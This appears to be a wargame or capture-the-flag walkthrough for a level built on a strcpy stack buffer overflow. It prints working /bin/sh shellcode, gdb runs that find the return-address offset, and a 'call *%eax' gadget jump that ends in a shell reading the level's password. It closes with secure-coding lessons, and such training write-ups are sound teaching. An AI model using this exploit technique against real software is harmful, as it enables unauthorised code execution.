## Level 4: always check array boundaries

The source code on this level is surprisingly simple:
```
void fun(char *str) {
  char buf[1024];
  strcpy(buf, str);
}

int main(int argc, char **argv) {
  // ... 
  fun(argv[1]);
  // ... 
}
```

There is an obvious problem here:
`strcpy` is well-known to be unsafe,
as it does not check if the destination array has enough space to store the source array.
With a sufficiently long command line argument we can overwrite the memory area beyond `buf` in the `fun` function.

If you recall from the previous challenge,
in the OS of our live CD,
the return address is stored on the stack after local variables.
That means that by overwriting `buf`,
we can overwrite the return address,
which in turn means that we can make the program jump to anywhere we want.

In the previous challenge we overwrote the return address to jump to the insecure function `run`.
In this case, however,
we don't have such insecure function within the program,
and thus no easy place to jump to.
On the other hand,
perhaps we can bring into the program our own code using the input string,
and then write over the end of the buffer to jump to our code.

What kind of code do we want to write to the input string?
The simplest possible code that will be useful for us is something that executes `/bin/sh`, also known as *shellcode*.
How can we write such code into the input string?
We could insert the binary content of the compiled shellcode the same we inserted the return address in binary form.

Writing the shellcode itself is beyond the scope of this article.
It is thoroughly explained in the Smash The Stack article,
see in the resources.
Essentially it is a modified version of this simple C program:
```
#include <stdio.h>

void main() {
   char *name[2];

   name[0] = "/bin/sh";
   name[1] = NULL;
   execve(name[0], name, NULL);
}
```
If you just compile this code and take its binary content to insert as the shellcode,
it won't work, for several reasons.
It is necessary to modify the machine language instructions,
among other things,
to eliminate null bytes from it.
This is necessary,
because `strcpy` stops copying at the first null character it sees,
which would break the shellcode.
There are many more important details to writing a suitable shellcode,
you can read more about it in the Smash The Stack article.

For our purposes,
we will take the finished shellcode from the Smash The Stack article:
```
char shellcode[] =
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";
```
Let's save it in the environment variable `EGG`:
```
EGG=$(printf '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh')
```
Next,
like in the previous challenge,
we need to find the right position in the input spring where we can overwrite the return address.
We know that the content of the stack will look like this when we are inside `fun`:
```
0x0000      content of the local variable buf (1024 bytes)
0x0400+?    the return address
```
That is, the return address is somewhere soon after the end of the buffer.
We can find the right position using `gdb`.
When we overwrite the return address with something invalid,
the program crashes with segmentation fault.
When `gdb` reaches such code,
it prints out this wrong address.
With a suitable input string and the output `gdb`,
we can find out the precise location we will want to overwrite.

Let's start the debugger,
and run the program with a crafted input string,
hopefully overwriting the return address:
```
level03@box:/levels/level04$ gdb ./level04
(gdb) run $(python -c 'print "A" * 1100')
Starting program: /levels/levels04/level04 $(python -c 'print "A" * 1100')

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```
Good, we have successfully overwritten the return address with "A"s.
Let's try a shorter string,
and something that will help us guess the correct position better:
```
(gdb) run $(python -c 'print "A" * 1024 + "abcdefghijklmnopqrstuvwxyz"')
Starting program: /levels/levels04/level04 $(python -c 'print "A" * 1024 + "abcdefghijklmnopqrstuvwxyz"')

Program received signal SIGSEGV, Segmentation fault.
0x706f6e6d in ?? ()
```
70, 6f, 6e, 6d, that's a decreasing sequence,
so it must be somewhere in our `abcd...xyz` sequence.
We can know exactly if we check the hexadecimal codes of our sequence:
```
$ echo abcdefghijklmnopqrstuvwxyz | hexdump -C
00000000  61 62 63 64 65 66 67 68  69 6a 6b 6c 6d 6e 6f 70  |abcdefghijklmnop|
00000010  71 72 73 74 75 76 77 78  79 7a 0a                 |qrstuvwxyz.|
0000001b
```
As `m=6d n=6e o=6f p=70`,
the return address is in the position of the letters `mnop`.
Since there are 12 letters before "m",
we can calculate that we need an input string of length 1024 + 12 + 4,
where the last 4 bytes will be the address we want to jump to.
Let's verify this final number with one last test in `gdb`:
```
(gdb) run $(python -c 'print "A" * 1036 + "mmmm"')
Starting program: /levels/levels04/level04 $(python -c 'print "A" * 1036 + "mmmm"')

Program received signal SIGSEGV, Segmentation fault.
0x6d6d6d6d in ?? ()
```
Ok that's really the one.
What next?
Our string should start with the shellcode,
followed by some padding until 1036 bytes,
and finally the address to jump to.
We can confirm the size of our shellcode using `wc -c`:
```
$ printf $EGG | wc -c
45
```
Thus, we will need 1036 - 45 = 991 padding characters.
But what about the address?
We want to jump to the address of `buf`,
but how can we know that?
Unfortunately, we cannot.
In the past,
the stack used to be always at the same address in memory,
which was relatively easy to exploit.
If you could get your shellcode on the stack,
it was relatively easy to guess the right address to jump at.
As of today,
this is no longer feasible,
thanks to the address space layout randomization (ASLR) used in modern operating systems.

So what can we do?
After hours of poking around,
I stumbled upon some interesting details which can be combined to an interesting effect:

- On 32-bit x86 processors (the architecture of the live CD),
  a function that returns a pointer value places its result in register `%eax`.

- There happen to be addresses inside the program which execute the code at the address stored in register `%eax`.

- `strcpy` is the last call in the function `fun`.

What happens is,
the `strcpy` will return the address of the destination array `buf`,
which will be stored in register `%eax`.
And since it is the last line of code in the function,
the register will still contain the address of `buf` when the function returns.
Thus,
if we overwrite the return address in the memory with the address that executes jumping to the content of `%eax`,
and consequently `buf`,
our shellcode will get executed.

We can find the location of calls with register `%eax` with:
```
level03@box:/levels/level04$ objdump -d level04 | grep call.*eax
 8048488:	ff 14 85 1c 9f 04 08 	call   *0x8049f1c(,%eax,4)
 80484cf:	ff d0                	call   *%eax
 80485fb:	ff d0                	call   *%eax
```
That's it, we can use either `0x080484cf` or `0x080485fb` as the address to jump to.
```
level03@box:/levels/level04$ ./level04 $EGG$(python -c 'print "A" * 991')$(printf '\xcf\x84\x04\x08')
/levels/level04 $ cat /home/level04/.password 
paegeiqu
```

What can we learn from all this?

- Don't use unsafe functions like `strcpy`.
  Stick to their safer versions like `strncpy`.

- Always make sure that arrays cannot be accessed beyond their boundaries.

- Always validate user input, and set reasonable limits to the length.
